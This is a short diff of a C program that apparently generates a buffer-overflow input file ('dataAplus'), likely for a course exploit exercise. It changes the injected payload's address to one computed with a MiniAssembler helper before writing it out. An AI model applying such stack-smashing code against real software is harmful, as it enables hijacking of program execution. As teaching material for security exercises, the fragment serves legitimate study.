@@ -22,7 +22,7 @@ int main(void) {
     putc('\0', dataAplus);
 
     printfAddress = 0x400690; 
-    payloadAddress = 0x420080; 
+    payloadAddress = MiniAssembler_adr(0, 0x420044, 0x420064);
 
     fwrite(&payloadAddress, sizeof(payloadAddress), 1, dataAplus);
 
